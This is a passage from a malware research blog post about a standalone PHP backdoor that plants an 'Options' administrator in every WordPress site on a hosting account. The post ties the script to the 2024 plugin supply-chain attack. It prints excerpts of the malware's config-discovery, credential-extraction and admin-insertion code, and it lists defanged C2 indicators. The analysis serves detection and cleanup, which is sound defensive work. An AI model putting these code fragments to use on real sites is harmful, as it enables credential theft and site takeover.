---
title: "Options" - A Standalone Admin Implanter Related to the 2024 Plugin Supply-Chain Attack
url: https://lukeleal.com/research/posts/options-admin-implanter-dynamic-linx/
source: Over Security
date: 2026-11-01
fetch_date: 2026-11-02T08:33:26.614246
---

# "Options" - A Standalone Admin Implanter Related to the 2024 Plugin Supply-Chain Attack

[# Cybersecurity Research 🚀](/research/posts/)

* Menu ▾
* + [Backdoors](https://lukeleal.com/research/tags/backdoor/)
  + [Phishing](https://lukeleal.com/research/tags/phishing/)
  + [Skimmers](https://lukeleal.com/research/tags/skimmer/)
  + [Past Research](https://blog.sucuri.net/author/luke)
  + [PGP Key](https://lukeleal.com/research/pages/pgp/)
  + [RSS](https://lukeleal.com/research/posts/index.xml)

* [Backdoors](https://lukeleal.com/research/tags/backdoor/)
* [Phishing](https://lukeleal.com/research/tags/phishing/)
* [Skimmers](https://lukeleal.com/research/tags/skimmer/)
* + ▾
  + - [Past Research](https://blog.sucuri.net/author/luke)
    - [PGP Key](https://lukeleal.com/research/pages/pgp/)
    - [RSS](https://lukeleal.com/research/posts/index.xml)

# [“Options” - A Standalone Admin Implanter Related to the 2024 Plugin Supply-Chain Attack](https://lukeleal.com/research/posts/options-admin-implanter-dynamic-linx/)

2026-02-16Luke

#[Options](https://lukeleal.com/research/tags/options/)
#[dynamic-linx.com](https://lukeleal.com/research/tags/dynamic-linx.com/)
#[AddSites](https://lukeleal.com/research/tags/addsites/)
#[pachamama](https://lukeleal.com/research/tags/pachamama/)
#[backdoor](https://lukeleal.com/research/tags/backdoor/)
#[supply chain](https://lukeleal.com/research/tags/supply-chain/)
#[WordPress](https://lukeleal.com/research/tags/wordpress/)
#[PHP](https://lukeleal.com/research/tags/php/)
#[website malware](https://lukeleal.com/research/tags/website-malware/)
!["Options" - A Standalone Admin Implanter Related to the 2024 Plugin Supply-Chain Attack](https://lukeleal.com/research/options-injector-v8-cyan-violet-cover-q90.jpg "Cover Image")

## Table of Contents

* [Where This Comes From](#where-this-comes-from)
* [Step 1: Find Every Site on the Account](#step-1-find-every-site-on-the-account)
* [Step 2: Read the Database Password](#step-2-read-the-database-password)
* [Step 3: Add the Admin Without Using WordPress](#step-3-add-the-admin-without-using-wordpress)
* [Step 4: Report the Login](#step-4-report-the-login)
* [Step 5: Clean Up](#step-5-clean-up)
* [The C2 Today](#the-c2-today)
* [Note on the Plugin Version](#note-on-the-plugin-version)
* [Detection & Cleanup](#detection--cleanup)
* [IOCs](#iocs)
* [Sample](#sample)

Most of the backdoors I see are hidden behind obfuscation. This one isn’t. `wp-control-final-dg.php` is 270 lines of plain, commented PHP, and it does one job very efficiently: **it puts an administrator account into every WordPress site on a hosting account.**

> WordPress never takes part. The script reads each site’s database password out of `wp-config.php`, connects to MySQL itself, and inserts the admin user with two `INSERT` statements.

It then sends the new login to the operator and deletes itself.

## Where This Comes From[#](#where-this-comes-from)

In June 2024 Wordfence reported (hxxps://www[.]wordfence[.]com/blog/2024/06/supply-chain-attack-on-wordpress-org-plugins-leads-to-5-maliciously-compromised-wordpress-plugins/) a supply-chain attack on five WordPress[.]org plugins, including **Social Warfare** (versions 4.4.6.4 to 4.4.7.1; fixed in 4.4.7.3). The injected code created a rogue administrator and reported it to an attacker-controlled server. The published indicators were two admin usernames, `Options` and `PluginAuth`, and the IP address `94.156.79[.]8`. (The Hacker News (hxxps://thehackernews[.]com/2024/06/multiple-wordpress-plugins-compromised.html) has a good summary.) No domains were named.

This sample uses the username **`Options`**, an **`/AddSites`** endpoint, and a function called **`pachamama()`**. I also have a copy of the compromised Social Warfare 4.4.7.1 main file, and the two share that same function name, the same code structure and the same endpoint. Here’s how they differ:

|  | Social Warfare 4.4.7.1 | `wp-control-final-dg.php` |
| --- | --- | --- |
| Admin username | `PluginAUTH` | `Options` |
| Reports to | `hxxps://94[.]156[.]79[.]8/AddSites` | `hxxps://dynamic-linx[.]com/AddSites` |
| Password | 13 random characters **per site** | 12 random characters **once per run** |
| Site domain | read from the database (`siteurl`) | guessed from the directory path |
| Runs | once, then sets an option so it never repeats | immediately, then deletes itself |
| Output | silenced | prints status lines |
| Extras | footer JavaScript, user counts to `/CMSUsers` | none |

The plugin version fixes several of the standalone one’s rough edges, which makes me think the standalone script is an **earlier or rougher build** of the same code. I can’t date it independently, though. My copy has a file date of September 2024, but that’s only when I saved it. I can say it’s the same code family, but not whether it’s the same operator.

## Step 1: Find Every Site on the Account[#](#step-1-find-every-site-on-the-account)

The script has no target. It goes looking for every `wp-config.php` it can reach:

```
function find_wp_configs(&$wp_config_paths, $depth = 0) {
    $current_directory = getcwd();
    $parent_directory = $current_directory;

    // Go back three parents
    for ($i = 0; $i < 3; $i++) {
        $parent_directory = dirname($parent_directory);
    }

    // Start the search from the parent directory
    find_wp_configs_recursive($parent_directory, $wp_config_paths);
}
```

It climbs three directories up from wherever it’s running, then walks **every subdirectory** below that, with no depth limit, collecting each `wp-config.php` it finds.

How far that reaches depends on where the script is when it runs, so I built a fake hosting account with made-up credentials and ran only the search functions against it. (I never ran the real script. It would connect to a database, call out to the attacker’s server and delete itself.)

| Script runs from | Scan starts at | Sites found |
| --- | --- | --- |
| `.../a.test/public_html/wp-content` | `/home/u/domains` | **every** site on the account, including nested installs |
| `.../a.test/public_html/wp-content/plugins/init` | `.../a.test/public_html` | only its own site |
| `/home/c/public_html/wp-content` (cPanel layout) | `/home` | every account the web user can read |

The script’s cleanup code only makes sense from the first row: a folder one level below a site’s root, such as `wp-content`. From there, three parents up is the directory that holds *all* of an account’s sites. On shared hosting, one foothold in one site turns into a rogue admin on every neighbor the web server’s user can read.

## Step 2: Read the Database Password[#](#step-2-read-the-database-password)

For each `wp-config.php`, the script pulls out the table prefix and the four connection settings with regular expressions:

```
if (preg_match("/\$table_prefix\s*=\s*'(.+?)';/", $config_content, $matches)) {
    $prefix = $matches[1];
} else if (preg_match("/table_prefix.*=.*'(.+?)';/", $config_content, $matches)) {
    $prefix = $matches[1];
}
```

The first pattern **can never match**. In a PHP double-quoted string, `\$` becomes a plain `$`, and in a regular expression a bare `$` means “end of line”. I ran both against a typical config: the first doesn’t match and the second does, so the second one rescues it every time.

Two more limits:

* The patterns only match **single-quoted** values. A config that uses double quotes or `getenv()` for the password gives the script an empty password. The connection then fails, and it prints `DATABASE ACCESS [FAIL]`.
* It assumes one setting per `define()`. That’s what a standard `wp-config.php` looks like, so on most sites it works.

## Step 3: Add the Admin Without Using WordPress[#](#step-3-add-the-admin-without-using-wordpress)

The core of the script is `add_admin_user()`. It opens its own `mysqli` connection and writes to the database tables directly:

```
$username = 'Options';
$password = $generated_password;
$user_role = 'administrator';
$hashed_password = password_hash($password, PASSWORD_DEFAULT);

$query = "INSERT INTO {$config['pr...